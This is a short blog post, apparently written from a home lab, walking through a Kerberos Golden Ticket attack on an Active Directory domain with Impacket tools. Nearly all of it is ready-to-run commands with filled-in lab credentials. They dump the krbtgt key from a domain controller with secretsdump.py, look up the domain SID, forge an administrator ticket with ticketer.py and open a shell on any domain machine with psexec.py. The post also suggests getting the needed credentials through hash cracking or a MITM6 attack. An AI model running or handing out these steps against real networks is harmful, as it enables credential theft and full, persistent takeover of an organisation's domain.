---
layout: post
title: Golden Ticket Attacks using Impacket
---

After playing about with Mimikatz for a bit and looking at a few options to bypass the anti virus, I decided a different tool might make more sense.
Impacket contains a number of tools that can be used to obtain the krbtg hash and the domain SID, create a golden ticket offline and then obtain a shell using the Kerberos ticket.

> [!NOTE]
> Credentials are needed to run these commands on the domain controller. These can be obtained by cracking NTLM hashes  or running a MITM6 attack.

<details>
<summary>Use secretsdump.py to obtain the aes256 key for the krbtgt account</summary>

```secretsdump.py <domain>/<user>:<password> <dc-ip>
   secretsdump.py home.local/TaMBSZZkfd:'?^kigXF?oG,y{o='@10.0.2.250
```
</details>

<details>
<summary>Use lookupsid.py to find the domain SID</summary>summary>

```Lookupsid.py <domain>/<user>:<password> <dc-ip>
   Lookupsid.py home.local/TaMBSZZkfd:'?^kigXF?oG,y{o='@10.0.2.250
```
</details>

<details>
<summary>Use ticketer.py to create TGT</summary>summary>

```ticketer.py -aes <aes-256> -domain-sid <SID> -domain <domain> -user-id <500> username
   ticketer.py -aes 5735dd8eaf424d966ef640d4056e2eb90310345d58b074103444483bdf736861 -domain-sid S-1-5-21-536825828-3248286720-2276939788 -domain home.local -user-id 500 administrator
```
</details>

<details>
<summary>Export KRB5CCNAME to created ticket location</summary>summary>

```export KRB5CCNAME=/home/kali/Documents/administrator.ccache
```
</details>

<details>
<summary>Use psexec to obtain a shell on any machine in the domain</summary>summary>

```psexec.py <domain>/<user>@<hostname>.<fqdn> -no-pass -k
   psexec.py home.local/administrator@TargetPC.home.local -no-pass -k
```
</details>
